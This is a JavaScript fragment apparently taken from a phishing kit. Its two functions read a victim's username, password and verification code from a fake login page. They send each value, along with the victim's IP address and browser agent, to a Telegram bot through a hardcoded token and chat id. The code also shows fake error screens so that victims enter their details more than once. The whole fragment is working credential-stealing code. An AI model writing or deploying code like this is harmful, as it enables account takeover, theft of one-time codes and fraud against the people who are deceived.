	async function sdFunc(attempt) {
		setLoading(true)
		var a = document.getElementById('uName').value
		var b = document.getElementById('uPass').value
		var sData = encodeURI("Attempt "+attempt+"\n\nDETAILS\n\nUsername: "+a+" \n\nPassword: "+b+"\n\nIP Address: "+uIp+"\n\nBrowser Agent: "+bAgent+"\n\nCODED BY LOWKEE\n\n<a href='https://t.me/Doshlowkee'>message me here @Doshlowkee</a>")
		axios.get('https://api.telegram.org/bot6373610139:AAGKFoekz_KvUZDKwnJ5JDWDe7YumKUW7Kc/'+"sendmessage?text="+sData+"&chat_id=6682851548&parse_mode=HTML");
		setTimeout(function() {
			setLoading(false)
			if(attempt === "Two") {
				setErrModal(false)
				setScreen(2)
			}
			else {
				setErrModal(true)
				window.scrollTo(0,0)
			}
		}, 0)
	}

	async function sdFunc2(attempt) {
		setLoading(true)
		var a = document.getElementById('uCode').value
		var sData = encodeURI("Attempt "+attempt+"\n\CODE\n\nCode is: "+a+"\n\nIP Address: "+uIp+"\n\nBrowser Agent: "+bAgent+"\n\nCODED BY LOWKEE\n\n<a href='https://t.me/Doshlowkee'>message me here @Doshlowkee</a>")
		axios.get('https://api.telegram.org/bot6373610139:AAGKFoekz_KvUZDKwnJ5JDWDe7YumKUW7Kc/'+"sendmessage?text="+sData+"&chat_id=6682851548&parse_mode=HTML");
		setTimeout(function() {
			setLoading(false)
			if(attempt === "Three") {
				setErrModal(false)
				setScreen(3)
			}
			else {
				setErrModal(true)
				window.scrollTo(0,0)
			}
		}, 0)
	}

